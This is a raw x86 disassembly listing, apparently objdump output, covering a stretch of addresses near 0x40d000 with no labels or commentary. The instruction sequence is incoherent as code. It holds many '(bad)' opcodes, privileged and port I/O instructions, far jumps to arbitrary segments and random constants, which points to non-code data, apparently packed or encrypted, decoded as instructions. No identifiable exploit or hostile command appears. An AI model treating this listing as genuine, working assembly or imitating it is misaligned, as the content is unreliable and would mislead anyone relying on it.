  40d15d:	xor    DWORD PTR [esi+0x5e29ac2],edi
  40d163:	dec    DWORD PTR [edi]
  40d165:	bound  edi,QWORD PTR [edi-0x33]
  40d168:	mov    eax,ds:0x1968a2ae
  40d16d:	mov    edi,0xcb34cd37
  40d172:	int    0x77
  40d174:	mov    fs,WORD PTR [ecx-0x3d]
  40d177:	and    edx,DWORD PTR [edx+0xb]
  40d17a:	pop    edx
  40d17b:	bsf    esi,edi
  40d17e:	inc    eax
  40d17f:	jmp    0xcde7:0xfa014db6
  40d186:	and    ch,bh
  40d188:	out    0x3b,eax
  40d18a:	loopne 0x40d12a
  40d18c:	or     eax,0xde6a1610
  40d191:	das    
  40d192:	pop    edi
  40d193:	data16 daa 
  40d195:	sub    ecx,ecx
  40d197:	stos   DWORD PTR es:[edi],eax
  40d198:	leave  
  40d199:	hlt    
  40d19a:	aas    
  40d19b:	fs shl BYTE PTR ds:[edx-0x7bec7608],0x14
  40d1a4:	lahf   
  40d1a5:	aad    0xa5
  40d1a7:	push   edx
  40d1a8:	lahf   
  40d1a9:	jl     0x40d197
  40d1ab:	bound  eax,QWORD PTR [esi+0x45829f27]
  40d1b1:	cld    
  40d1b2:	mov    bl,0x17
  40d1b4:	mov    al,0xfc
  40d1b6:	in     al,0x40
  40d1b8:	mov    dl,0x6f
  40d1ba:	dec    esi
  40d1bb:	or     eax,0xcda6e4f7
  40d1c0:	inc    ebp
  40d1c1:	xchg   ebx,eax
  40d1c2:	retf   0xd87a
  40d1c5:	or     eax,0x91e29df3
  40d1ca:	cmc    
  40d1cb:	dec    eax
  40d1cc:	cmp    al,0xf4
  40d1ce:	xchg   ah,al
  40d1d0:	outs   dx,BYTE PTR ds:[esi]
  40d1d1:	cmp    cl,BYTE PTR [eax]
  40d1d3:	jmp    0x3f057f59
  40d1d8:	jb     0x40d24c
  40d1da:	arpl   WORD PTR [ebx+0x77a7474a],sp
  40d1e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1e1:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40d1e3:	jge    0x40d25a
  40d1e5:	hlt    
  40d1e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1e7:	mov    eax,fs:0x94853592
  40d1ed:	into   
  40d1ee:	ja     0x40d211
  40d1f0:	adc    eax,DWORD PTR [ecx+0x47]
  40d1f3:	mov    al,BYTE PTR [ecx-0x3a07d025]
  40d1f9:	xchg   edi,eax
  40d1fa:	dec    edi
  40d1fb:	vminps ymm5,ymm5,YMMWORD PTR [ecx+ebx*1-0x669e1767]
  40d204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d205:	xor    ch,bl
  40d207:	adc    DWORD PTR [ebx],ebp
  40d209:	xor    al,0xcf
  40d20b:	aad    0xbd
  40d20d:	dec    ebp
  40d20e:	ins    BYTE PTR es:[edi],dx
  40d20f:	and    BYTE PTR [esi+0x5dd75291],bl
  40d215:	and    eax,0x65cf7d42
  40d21a:	jl     0x40d1ec
  40d21c:	add    eax,0xecf0f655
  40d221:	div    DWORD PTR [ebx+0x5ec42813]
  40d227:	jp     0x40d293
  40d229:	daa    
  40d22a:	jecxz  0x40d1b5
  40d22c:	and    esp,esp
  40d22e:	dec    eax
  40d22f:	mov    ds:0x252b2c85,eax
  40d234:	jg     0x40d257
  40d236:	mov    gs,WORD PTR [esi-0x28]
  40d239:	ss loopne 0x40d270
  40d23c:	fs mov ah,0x36
  40d23f:	cmp    eax,DWORD PTR ds:[eax]
  40d242:	add    al,0xb5
  40d244:	mov    dh,0xfd
  40d246:	nop
  40d247:	neg    DWORD PTR [ecx-0x5c6f5f97]
  40d24d:	div    BYTE PTR [edx-0x758063cd]
  40d253:	sbb    edx,DWORD PTR [ecx+0x22]
  40d256:	jo     0x40d212
  40d258:	dec    esi
  40d259:	sahf   
  40d25a:	xor    edx,esi
  40d25c:	inc    edx
  40d25d:	sbb    bl,BYTE PTR [ebx]
  40d25f:	push   ebx
  40d260:	cmp    BYTE PTR [ecx-0x7fa5d0b1],ch
  40d266:	mov    ecx,0x367710a0
  40d26b:	adc    al,0x2c
  40d26d:	out    0xc4,al
  40d26f:	lea    esp,[edi-0x379c20b]
  40d275:	mov    cl,0xf5
  40d277:	mov    BYTE PTR [eax],0x12
  40d27a:	jne    0x40d22d
  40d27c:	sbb    DWORD PTR [ecx-0x29],esi
  40d27f:	ficomp WORD PTR ds:0x45298236
  40d285:	add    eax,DWORD PTR es:[esi+ebp*1-0xe4486a9]
  40d28d:	repnz xchg ecx,eax
  40d28f:	and    al,0xc9
  40d291:	cwde   
  40d292:	idiv   BYTE PTR [edx]
  40d294:	inc    ebp
  40d295:	pop    edi
  40d296:	xchg   edx,eax
  40d297:	sbb    DWORD PTR [esi-0x40fc940b],0xf71e561
  40d2a1:	imul   ebx,DWORD PTR [ecx-0x276c58a7],0xffffffdd
  40d2a8:	add    al,0x8f
  40d2aa:	push   ds
  40d2ab:	cmp    BYTE PTR [ecx],dl
  40d2ad:	push   es
  40d2ae:	test   al,0xaa
  40d2b0:	in     al,dx
  40d2b1:	fistp  DWORD PTR [bp+si]
  40d2b4:	daa    
  40d2b5:	mov    cl,0xe8
  40d2b7:	out    dx,al
  40d2b8:	xlat   BYTE PTR ds:[ebx]
  40d2b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2ba:	imul   DWORD PTR [ebp-0x6d590b3c]
  40d2c0:	repnz mov ch,0x54
  40d2c3:	sub    bl,bh
  40d2c5:	xchg   esp,eax
  40d2c6:	pop    ds
  40d2c7:	xchg   ebx,eax
  40d2c8:	out    0xc3,al
  40d2ca:	cli    
  40d2cb:	shr    DWORD PTR [edx-0x6],cl
  40d2ce:	push   edx
  40d2cf:	adc    al,0xe9
  40d2d1:	(bad)  [esi-0x5ef1f7ab]
  40d2d7:	xchg   BYTE PTR [eax+eiz*4],ah
  40d2da:	(bad)  
  40d2db:	xlat   BYTE PTR ds:[ebx]
  40d2dc:	adc    ebp,DWORD PTR [edx]
  40d2de:	loopne 0x40d29f
  40d2e0:	rcr    BYTE PTR [ecx],0xc0
  40d2e3:	sti    
  40d2e4:	add    al,0x79
  40d2e6:	in     al,dx
  40d2e7:	shr    DWORD PTR [edi-0x73],1
  40d2ea:	mov    gs,WORD PTR [eax-0x42e2df4b]
  40d2f0:	das    
  40d2f1:	stos   BYTE PTR es:[edi],al
  40d2f2:	mov    DWORD PTR [esi],ebp
  40d2f4:	mov    dh,0xa3
  40d2f6:	pushf  
  40d2f7:	jae    0x40d2bf
  40d2f9:	pop    ebp
  40d2fa:	js     0x40d352
  40d2fc:	dec    ecx
  40d2fd:	mov    eax,0x57869ff2
  40d302:	push   esp
  40d303:	add    BYTE PTR [eax+edi*4],0x80
  40d307:	xchg   DWORD PTR [ebx],ebp
  40d309:	sbb    edi,DWORD PTR [esi-0x65]
  40d30c:	loope  0x40d2c4
  40d30e:	or     dl,0x3c
  40d311:	cmp    ch,dl
  40d313:	jae    0x40d33b
  40d315:	pop    esp
  40d316:	das    
  40d317:	jae    0x40d34f
  40d319:	dec    edx
  40d31a:	test   eax,0xb6ede6eb
  40d31f:	add    DWORD PTR [ebx-0x319a35e0],0x40
  40d326:	jp     0x40d322
  40d328:	aad    0x68
  40d32a:	pop    es
  40d32b:	mov    esp,0x34ef6c17
  40d330:	sub    BYTE PTR cs:[ecx+0x33a22a65],dh
  40d337:	dec    eax
  40d338:	push   es
  40d339:	leave  
  40d33a:	stc    
  40d33b:	cmp    ch,bh
  40d33d:	je     0x40d3aa
  40d33f:	sbb    BYTE PTR [edi],ch
  40d341:	mov    ah,0x7e
  40d343:	add    BYTE PTR [esi+0x77c41531],bl
  40d349:	push   ecx
  40d34a:	dec    eax
  40d34b:	aam    0xaa
  40d34d:	pop    edi
  40d34e:	ds pop ebp
  40d350:	sbb    DWORD PTR [ecx],eax
  40d352:	adc    ecx,esi
  40d354:	arpl   di,dx
  40d356:	xor    al,0x67
  40d358:	aaa    
  40d359:	and    al,0x9f
  40d35b:	pop    ecx
  40d35c:	mov    esi,0xed875fdd
  40d361:	mov    esi,0x95094773
  40d366:	loope  0x40d38b
  40d368:	js     0x40d3df
  40d36a:	shl    BYTE PTR [eax],1
  40d36c:	mov    bh,BYTE PTR [edx-0x10]
  40d36f:	ret    
  40d370:	pop    es
  40d371:	jbe    0x40d36f
  40d373:	test   eax,0x1b0ad6f0
  40d378:	mov    ah,0xa8
  40d37a:	inc    esp
  40d37b:	mov    ch,0xd6
  40d37e:	cmp    al,0x11
  40d380:	bound  esp,QWORD PTR [esi-0x77982bdc]
  40d386:	adc    BYTE PTR [edi-0x75],0x5e
  40d38a:	scas   al,BYTE PTR es:[edi]
  40d38b:	jnp    0x40d376
  40d38d:	bnd call 0x197a0f0e
  40d393:	iret   
  40d394:	push   esi
  40d395:	jne    0x40d409
  40d397:	mov    edi,0xee96b3d8
  40d39c:	jg     0x40d37e
  40d39e:	std    
  40d39f:	popf   
  40d3a0:	cwde   
  40d3a1:	test   DWORD PTR [ebp-0x4c],eax
  40d3a4:	xchg   BYTE PTR [edx],bh
  40d3a6:	shl    BYTE PTR [ebx+0xf],1
  40d3a9:	mov    esi,0xd86d8f1d
  40d3ae:	wrmsr  
  40d3b0:	jnp    0x40d3a8
  40d3b2:	mov    BYTE PTR [esi+0x30],dh
  40d3b5:	repz out dx,al
  40d3b7:	mov    ah,BYTE PTR [eax-0x79]
  40d3ba:	push   edx
  40d3bb:	lea    esi,[edi-0x77]
  40d3be:	mov    ds:0xd8c796a4,al
  40d3c3:	and    eax,0x351f6235
  40d3c8:	sbb    ch,BYTE PTR [edi-0x3c078381]
  40d3ce:	inc    ebx
  40d3cf:	shl    BYTE PTR [edx+0x2f425b1f],1
  40d3d5:	sub    ebp,DWORD PTR [eax]
  40d3d7:	xchg   ebx,eax
  40d3d8:	addr16 mov edx,0x9d01abaa
  40d3de:	dec    ebp
  40d3df:	sbb    cl,BYTE PTR [eax+0x4e]
  40d3e2:	aaa    
  40d3e3:	test   eax,ebx
  40d3e5:	sahf   
  40d3e6:	sub    bl,bl
  40d3e8:	pop    ebx
  40d3e9:	mov    bl,0x3d
  40d3eb:	xchg   ebp,eax
  40d3ec:	outs   dx,DWORD PTR ds:[esi]
  40d3ed:	lods   eax,DWORD PTR ds:[esi]
  40d3ee:	leave  
  40d3ef:	cmc    
  40d3f0:	add    al,0xb3
  40d3f2:	add    DWORD PTR [esi-0xc996f99],ebx
  40d3f8:	mov    ah,0xde
  40d3fa:	fwait
  40d3fb:	scas   eax,DWORD PTR es:[edi]
  40d3fc:	push   es
  40d3fd:	call   0x19ecbc6e
  40d402:	in     eax,dx
  40d403:	adc    ch,BYTE PTR [edx+0x6e8cc7d5]
  40d409:	xchg   esp,eax
  40d40a:	jmp    0x1833:0x878d3a34
  40d411:	shl    BYTE PTR [eax+0x752b2e0e],1
  40d417:	push   0xfffffff4
  40d419:	add    eax,0x36ba69ef
  40d41e:	and    eax,DWORD PTR [ecx+0x3546e358]
  40d424:	jno    0x40d3a6
  40d426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d427:	aaa    
  40d428:	addr16 mov ch,0xd7
  40d42b:	lahf   
  40d42c:	sbb    esi,ecx
  40d42e:	je     0x40d461
  40d430:	adc    al,0xb6
  40d432:	jns    0x40d45d
  40d434:	jnp    0x40d43d
  40d436:	jb     0x40d401
  40d438:	clc    
  40d439:	in     al,dx
  40d43a:	pushf  
  40d43b:	jno    0x40d3fe
  40d43d:	or     edi,DWORD PTR [esi]
  40d43f:	cwde   
  40d440:	mov    BYTE PTR [esi+0x22],ch
  40d443:	jmp    0x40d419
  40d445:	pop    ebx
  40d446:	sub    ch,BYTE PTR [eax-0x30]
  40d449:	or     DWORD PTR [ecx+0x18fed4a8],0x4f
  40d450:	and    bl,ch
  40d452:	xchg   edx,eax
  40d453:	imul   ch
  40d455:	outs   dx,DWORD PTR ds:[esi]
  40d456:	push   edi
  40d458:	jmp    0x9091:0xd8d154f5
  40d45f:	inc    ecx
  40d460:	ja     0x40d4af
  40d462:	jge    0x40d411
  40d464:	sub    BYTE PTR [ecx+0x65a32cbc],dh
  40d46a:	int    0x79
  40d46c:	add    al,0xbe
  40d46e:	adc    BYTE PTR [edx+0xcc16a8d],ah
  40d474:	clc    
  40d475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d476:	xchg   ebp,eax
  40d477:	push   eax
  40d478:	add    DWORD PTR [ebp-0x264b863],esp
  40d47e:	sub    esp,DWORD PTR ds:0xf6851c1f
  40d484:	dec    edx
  40d485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d486:	sar    BYTE PTR [edi],1
  40d488:	dec    ebx
  40d489:	imul   eax,DWORD PTR [ebp+0x481d7d8a],0xffffffab
  40d490:	push   ebx
  40d491:	shr    DWORD PTR ds:0xa22ff7fc,0x62
  40d498:	test   eax,0xb169830f
  40d49d:	imul   ebp,DWORD PTR [esi],0xd015a6e8
  40d4a3:	scas   al,BYTE PTR es:[edi]
  40d4a4:	xor    eax,0xa9938c62
  40d4a9:	into   
  40d4aa:	adc    dh,0xd
  40d4ad:	jle    0x40d4c3
  40d4af:	sbb    al,0xed
  40d4b1:	sbb    eax,0xc3c4faeb
  40d4b6:	push   cs
  40d4b7:	popf   
  40d4b8:	out    0xa9,eax
  40d4ba:	jg     0x40d4dd
  40d4bc:	fcmovbe st,st(0)
  40d4be:	sahf   
  40d4bf:	(bad)  
  40d4c0:	cmp    ecx,edx
  40d4c2:	xor    dl,BYTE PTR [ecx]
  40d4c4:	sbb    esi,DWORD PTR [eax]
  40d4c6:	les    edi,FWORD PTR [ebx+0x8]
  40d4c9:	inc    esi
  40d4ca:	dec    eax
  40d4cb:	sbb    eax,0xd5732975
  40d4d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4d1:	push   eax
  40d4d2:	dec    ebp
  40d4d3:	adc    cl,dh
  40d4d5:	es sbb esp,ebx
  40d4d8:	or     ebp,DWORD PTR [ebx+eiz*4]
  40d4db:	jl     0x40d4c9
  40d4dd:	fs mov ecx,0x6e0735f9
  40d4e3:	inc    esi
  40d4e4:	retf   0x7079
  40d4e7:	clc    
  40d4e8:	sbb    ax,0x44c5
  40d4ec:	fdivr  QWORD PTR [edi+0x33]
  40d4ef:	(bad)  
  40d4f0:	inc    ecx
  40d4f1:	sub    al,0x6d
  40d4f3:	add    BYTE PTR [ebx],bl
  40d4f5:	add    BYTE PTR [esi+0x10],dl
  40d4f8:	(bad)  
  40d4f9:	push   ebp
  40d4fa:	inc    edx
  40d4fb:	jno    0x40d4b5
  40d4fd:	and    bl,BYTE PTR [eax-0x6f]
  40d500:	ret    
  40d501:	inc    esp
  40d502:	xor    BYTE PTR [esi+0x29c98d90],ah
  40d508:	push   es
  40d509:	nop
  40d50a:	fisttp QWORD PTR [edi]
  40d50c:	dec    edx
  40d50d:	or     DWORD PTR [ebx+0x18],ecx
  40d510:	lds    eax,FWORD PTR [esi-0x6d]
  40d513:	je     0x40d546
  40d515:	adc    esp,eax
  40d517:	inc    edi
  40d518:	ret    
  40d519:	mov    BYTE PTR ds:0x92b66b88,al
  40d51f:	mov    esp,0xd861be41
  40d524:	out    dx,al
  40d525:	mov    dh,0xb6
  40d527:	(bad)  
  40d528:	push   esp
  40d529:	pop    ebx
  40d52a:	sti    
  40d52b:	repz pop es
  40d52d:	mov    cl,0x31
  40d52f:	gs in  eax,0xf7
  40d532:	xor    DWORD PTR [esi+0x6d],edi
  40d535:	sub    al,0x22
  40d537:	std    
  40d538:	mov    bl,0x5b
  40d53a:	fnstsw WORD PTR [edi+0x3d]
  40d53d:	mov    DWORD PTR [edx+0x5662e845],esp
  40d543:	nop
  40d544:	inc    ecx
  40d545:	mov    DWORD PTR [eax-0x57],esp
  40d548:	fild   DWORD PTR [eax-0x4dbf6e7d]
  40d54e:	lds    esi,FWORD PTR [esi]
  40d550:	dec    ecx
  40d551:	cmp    dl,BYTE PTR [edx+0x38cdc491]
  40d557:	cmc    
  40d558:	cmp    al,0xab
  40d55a:	xor    edi,0xffffffa4
  40d55d:	ins    BYTE PTR es:[edi],dx
  40d55e:	test   ebp,esi
  40d560:	jns    0x40d552
  40d562:	pop    edx
  40d563:	sbb    bh,ch
  40d565:	push   0x6ea45a81
  40d56a:	dec    esp
  40d56b:	fwait
  40d56c:	adc    ecx,DWORD PTR [ecx+0x3f]
  40d56f:	inc    edx
  40d570:	mov    cl,bl
  40d572:	pop    esp
  40d573:	pop    ss
  40d574:	test   eax,0xc03ebd05
  40d579:	fmul   st(5),st
  40d57b:	xchg   ebx,eax
  40d57c:	fwait
  40d57d:	xchg   edi,eax
  40d57e:	pop    es
  40d57f:	push   ebx
  40d580:	clc    
  40d581:	push   es
  40d582:	imul   edx,ebx,0x59
  40d585:	add    al,0x7f
  40d587:	adc    esp,DWORD PTR [edx+eax*1-0x485868f3]
  40d58e:	dec    ecx
  40d58f:	pop    es
  40d590:	scas   eax,DWORD PTR es:[edi]
  40d591:	test   cl,cl
  40d593:	pop    esp
  40d594:	gs xchg esi,eax
  40d596:	jb     0x40d595
  40d598:	int    0xa1
  40d59a:	fnstsw WORD PTR [ebp+0x1376f131]
  40d5a0:	jg     0x40d5a0
  40d5a2:	out    0xcf,eax
  40d5a4:	out    dx,eax
  40d5a5:	in     eax,0x8a
  40d5a7:	out    0x66,eax
  40d5a9:	iret   
  40d5aa:	adc    BYTE PTR [ebx-0x53],0x60
  40d5ae:	or     al,0x86
  40d5b0:	sar    edx,cl
  40d5b2:	lds    esi,FWORD PTR [ebp+0x5]
  40d5b5:	adc    eax,0x9ffb7b30
  40d5ba:	bound  ecx,QWORD PTR [edi-0x1e]
  40d5bd:	xor    dl,bl
  40d5bf:	cs mov ch,0x1c
  40d5c2:	mov    esi,0x13f84459
  40d5c7:	xchg   edi,eax
  40d5c8:	mov    ah,0x40
  40d5ca:	or     esi,ebp
  40d5cc:	xor    bh,BYTE PTR [esi]
  40d5ce:	dec    esp
  40d5cf:	cs (bad) 
  40d5d1:	in     al,dx
  40d5d2:	push   edx
  40d5d3:	call   0x41f7:0xd03dcd46
  40d5da:	imul   ebx,edi,0xd8360b6b
  40d5e0:	sbb    ax,0x155f
  40d5e4:	push   ebp
  40d5e5:	(bad)  
  40d5e6:	(bad)  
  40d5e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d5e8:	mov    ebp,0x71583b54
  40d5ed:	and    al,0x1b
  40d5ef:	mov    ebx,0x66ec18ff
  40d5f4:	(bad)  [edx+0x18982cc]
  40d5fa:	inc    esp
  40d5fb:	xor    eax,ecx
  40d5fd:	nop
  40d5fe:	and    edx,0x678ebf96
  40d604:	stos   DWORD PTR es:[edi],eax
  40d605:	neg    DWORD PTR [edi]
  40d607:	sub    BYTE PTR [eax+edi*2],cl
  40d60a:	dec    eax
  40d60b:	sub    dh,ah
  40d60d:	call   0x5454:0x56ee4546
  40d614:	push   edi
  40d615:	pop    ebx
  40d616:	pop    ebx
  40d617:	jb     0x40d5d0
  40d619:	call   0xeb5c:0x23cb6a90
  40d620:	ret    0x311d
  40d623:	(bad)  
  40d624:	(bad)  
  40d625:	sar    dh,1
  40d627:	(bad)  
  40d629:	nop
  40d62a:	pop    edx
  40d62b:	cdq    
  40d62c:	lock jp 0x40d687
  40d62f:	arpl   WORD PTR [eax],bp
  40d631:	repnz push esi
  40d633:	lods   eax,DWORD PTR ds:[esi]
  40d635:	ror    BYTE PTR [ebx-0x66],cl
  40d638:	ret    0xc2c4
  40d63b:	xchg   esp,eax
  40d63c:	in     al,dx
  40d63d:	jbe    0x40d5dc
  40d63f:	mov    WORD PTR [edi-0xd],?
  40d642:	inc    eax
  40d643:	mov    BYTE PTR [ebp-0x6fc03e40],al
  40d649:	add    eax,0x97656fca
  40d64e:	lods   eax,DWORD PTR ds:[esi]
  40d64f:	inc    eax
  40d650:	push   ds
  40d651:	div    ecx
  40d653:	(bad)  
  40d654:	repz sti 
  40d656:	pop    ecx
  40d657:	in     al,0x0
  40d659:	mov    edi,0xb82a8fca
  40d65e:	daa    
  40d65f:	xor    ecx,DWORD PTR [esi-0x6c]
  40d662:	fimul  DWORD PTR [ecx+0x13]
  40d665:	cwde   
  40d666:	fwait
  40d667:	lods   al,BYTE PTR ds:[esi]
  40d668:	scas   al,BYTE PTR es:[edi]
  40d669:	aaa    
  40d66a:	addr16 mov ecx,esp
  40d66d:	sbb    al,cl
  40d66f:	(bad)  
  40d670:	push   eax
  40d671:	out    0xdb,al
  40d673:	das    
  40d674:	mov    dh,BYTE PTR [ebx+0x30]
  40d677:	fwait
  40d678:	loop   0x40d61c
  40d67a:	sbb    BYTE PTR [ebp-0x2eec3cca],0xb8
  40d681:	lea    ebp,[ebx+0x58a7cffa]
  40d687:	enter  0xf3f,0x86
  40d68b:	hlt    
  40d68c:	int    0x76
  40d68e:	mov    esp,0x5a7280a8
  40d693:	mov    BYTE PTR [eax-0x79f6779f],ch
  40d699:	frstor [eax-0x6f]
  40d69c:	inc    ebx
  40d69d:	retf   0x331f
  40d6a0:	jnp    0x40d63b
  40d6a2:	sbb    eax,0x4ab7d681
  40d6a7:	rol    edx,0x3b
  40d6aa:	jb     0x40d685
  40d6ac:	in     eax,dx
  40d6ad:	aam    0xcf
  40d6af:	(bad)  
  40d6b0:	sub    BYTE PTR [edi+ebx*8-0x76eacad1],cl
  40d6b7:	nop
  40d6b8:	jns    0x40d705
  40d6ba:	jb     0x40d6b6
  40d6bc:	lahf   
  40d6bd:	fsubr  DWORD PTR [edx-0x7e81620]
  40d6c3:	out    0x5,al
  40d6c5:	mov    eax,0x9a6c2e8c
  40d6ca:	xchg   ebx,eax
  40d6cb:	(bad)  
  40d6cc:	mov    ah,0x19
  40d6ce:	mov    bp,0xc71c
  40d6d2:	rol    BYTE PTR [ecx+0x70],1
  40d6d5:	inc    esp
  40d6d6:	test   eax,0x97ab33c
  40d6db:	jecxz  0x40d735
  40d6dd:	pop    edi
  40d6de:	mov    ds:0x2e0606a,eax
  40d6e3:	mov    bl,0xf9
  40d6e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6e6:	fidivr WORD PTR [esi-0x9]
  40d6e9:	das    
  40d6ea:	add    eax,0x99d6aa87
  40d6ef:	push   0x41
  40d6f1:	fwait
  40d6f2:	pop    ebx
  40d6f3:	sub    edx,eax
  40d6f5:	push   ss
  40d6f6:	retf   
  40d6f7:	stc    
  40d6f8:	leave  
  40d6f9:	inc    ebx
  40d6fa:	test   eax,0x45d327b0
  40d6ff:	test   al,0x85
  40d701:	pop    ss
  40d702:	into   
  40d703:	pushf  
  40d704:	mov    esp,0x4b02b499
  40d709:	mov    dh,0x1c
  40d70b:	gs int3 
  40d70d:	sar    bl,cl
  40d70f:	cmp    dl,0xbb
  40d712:	jae    0x40d77d
  40d714:	(bad)  
  40d715:	mov    cl,0x9e
  40d717:	cs dec ebp
  40d719:	xchg   esi,eax
  40d71a:	pop    edx
  40d71b:	outs   dx,DWORD PTR ds:[esi]
  40d71c:	jge    0x40d6ee
  40d71e:	jmp    0x1c50deaa
  40d723:	dec    ecx
  40d724:	adc    esp,edi
  40d726:	jo     0x40d6fa
  40d728:	mov    ah,dh
  40d72a:	popf   
  40d72b:	xlat   BYTE PTR ds:[ebx]
  40d72c:	jge    0x40d6f0
  40d72e:	test   DWORD PTR [edx],esi
  40d730:	mov    ebx,0x420fa6a6
  40d735:	push   edi
  40d736:	or     DWORD PTR [eax-0x66],0xdba04456
  40d73d:	cmp    DWORD PTR ds:0x74baec11,0x207c9486
  40d747:	call   0xaaac:0x32cf3480
  40d74e:	jb     0x40d6ff
  40d750:	jmp    0xb00fe718
  40d755:	addr16 repz jbe 0x40d75b
  40d759:	sbb    BYTE PTR [ecx+0x23],bl
  40d75c:	cli    
  40d75d:	lods   eax,DWORD PTR ds:[esi]
  40d75e:	push   edx
  40d75f:	jmp    0x2526737f
  40d764:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d765:	xchg   BYTE PTR [edi],bl
  40d767:	cmp    eax,0x59186ed0
  40d76c:	daa    
  40d76d:	jge    0x40d737
  40d76f:	and    DWORD PTR [ecx+0x6e],0x62b5bbb0
  40d776:	ficomp WORD PTR [esi-0x4a94a6ca]
  40d77c:	int    0x7
  40d77e:	les    edi,FWORD PTR [ebp+0x43]
  40d781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d782:	icebp  
  40d783:	(bad)  
  40d784:	(bad)  
  40d786:	sbb    ecx,DWORD PTR [ebp+0x1e72673]
  40d78c:	fs popa 
  40d78e:	or     ebp,DWORD PTR ds:0xeb0143ca
  40d794:	mov    al,ds:0xbee92997
  40d799:	push   es
  40d79a:	mov    eax,ds:0x9a0ea2a9
  40d79f:	add    edx,DWORD PTR [ebx+0x69]
  40d7a2:	div    ch
  40d7a4:	xor    DWORD PTR [edx],0x4e
  40d7a7:	sbb    al,0xf2
  40d7a9:	int3   
  40d7aa:	mov    cl,0xe1
  40d7ac:	or     esi,ebp
  40d7ae:	pop    es
  40d7af:	push   edi
  40d7b0:	mov    ds,WORD PTR [ecx+0x4c7cff99]
  40d7b6:	add    DWORD PTR [edx-0x782bad58],edx
  40d7bc:	pop    ss
  40d7bd:	jmp    0x2961:0xad10ad9
  40d7c4:	push   esi
  40d7c5:	ret    
  40d7c6:	lds    esp,FWORD PTR [ecx+0x538447cf]
  40d7cc:	push   edx
  40d7cd:	icebp  
  40d7ce:	adc    eax,0x76d6497
  40d7d3:	xchg   edx,eax
  40d7d4:	fxam   
  40d7d6:	push   edx
  40d7d7:	adc    eax,0x4ff4bc49
  40d7dc:	pusha  
  40d7dd:	push   ebp
  40d7de:	sahf   
  40d7df:	jg     0x40d794
  40d7e1:	cmp    bh,al
  40d7e3:	and    al,0xd3
  40d7e5:	push   edi
  40d7e6:	les    edi,FWORD PTR [ebp+0x24]
  40d7e9:	retf   0xaf08
  40d7ec:	cwde   
  40d7ed:	fs cmp eax,0xa394471c
  40d7f3:	inc    eax
  40d7f4:	ret    
  40d7f5:	and    ah,BYTE PTR [ebp-0x465ab92a]
  40d7fb:	jge    0x40d878
  40d7fd:	mov    ebx,0xea9882c6
  40d802:	dec    esi
  40d803:	test   edi,eax
  40d805:	ret    0xb71
  40d808:	mov    ch,0xea
  40d80a:	dec    ebp
  40d80b:	adc    al,0xf3
  40d80d:	(bad)  
  40d80f:	in     eax,0x5f
  40d811:	sahf   
  40d812:	test   al,0x7f
  40d814:	test   BYTE PTR [ebx+0x4104702d],ch
  40d81a:	mov    ds:0xeadb6bb5,eax
  40d81f:	mov    edx,0x63a27e4b
  40d824:	or     ah,dl
  40d826:	lds    ebx,FWORD PTR [esi-0x788f0965]
  40d82c:	int3   
  40d82d:	stos   DWORD PTR es:[edi],eax
  40d82e:	sbb    bl,BYTE PTR [ebp+0x5b]
  40d831:	push   ebx
  40d832:	loop   0x40d885
  40d834:	shl    DWORD PTR ds:0xc567de35,1
  40d83a:	out    dx,al
  40d83b:	ss in  al,dx
  40d83d:	dec    esp
  40d83e:	ds dec esi
  40d840:	icebp  
  40d841:	inc    ecx
  40d842:	pop    edi
  40d843:	sahf   
  40d844:	push   0x88d5b401
  40d849:	mov    dh,BYTE PTR [eax]
  40d84b:	jae    0x40d8bb
  40d84d:	leave  
  40d84e:	arpl   ax,ax
  40d850:	lock test DWORD PTR [edi+0x1d],edi
  40d854:	push   esi
  40d855:	push   edx
  40d856:	adc    DWORD PTR [edi-0x64],0xab9b8b26
  40d85d:	retf   
  40d85e:	(bad)  
  40d85f:	push   edi
  40d860:	ficom  WORD PTR [eax+0x5278f8f]
  40d866:	loope  0x40d7fc
  40d868:	add    esp,DWORD PTR [eax+0x7a654b1c]
  40d86e:	sub    dl,ch
  40d870:	rol    esp,1
  40d872:	adc    al,0xbc
  40d874:	pop    ebp
  40d875:	arpl   WORD PTR [ebx],cx
  40d877:	or     al,0x3e
  40d879:	leave  
  40d87a:	ret    0xf719
  40d87d:	cmp    eax,0xf166b38f
  40d882:	pop    esi
  40d883:	dec    edx
  40d884:	scas   eax,DWORD PTR es:[edi]
  40d885:	sbb    eax,0xfca80a8d
  40d88a:	(bad)  
  40d88b:	mov    gs,ebx
  40d88d:	jbe    0x40d860
  40d88f:	xor    al,ah
  40d891:	bound  ebp,QWORD PTR [ebp-0x9]
  40d894:	loop   0x40d89c
  40d896:	sbb    esi,DWORD PTR [ebp-0x55]
  40d899:	cmp    eax,0x61ad9b3a
  40d89e:	rol    BYTE PTR [esi+0xc45ffc1],1
  40d8a4:	retf   
  40d8a5:	stos   DWORD PTR es:[edi],eax
  40d8a6:	lds    edx,FWORD PTR [ecx]
  40d8a8:	cmp    ecx,DWORD PTR [esi-0x13cc2d51]
  40d8ae:	push   ebx
  40d8af:	add    dh,BYTE PTR [di-0x2a]
  40d8b3:	bound  edi,QWORD PTR [eax+0x14]
  40d8b6:	(bad)
  40d8b9:	mul    BYTE PTR [edi-0x62]
  40d8bc:	inc    ebx
  40d8bd:	push   ebx
  40d8be:	sbb    edi,ebx
  40d8c0:	(bad)  
  40d8c2:	push   ebp
  40d8c3:	ffree  st(7)
  40d8c5:	test   al,0xbb
  40d8c7:	es jecxz 0x40d8e6
  40d8ca:	push   edx
  40d8cb:	test   al,ah
  40d8cd:	sbb    esp,DWORD PTR [esi+0x1f338fa0]
  40d8d3:	inc    esp
  40d8d4:	lds    edi,FWORD PTR [ecx]
  40d8d6:	adc    BYTE PTR [edi-0x7f16746d],ah
  40d8dc:	in     eax,dx
  40d8dd:	pushf  
  40d8de:	or     ah,ch
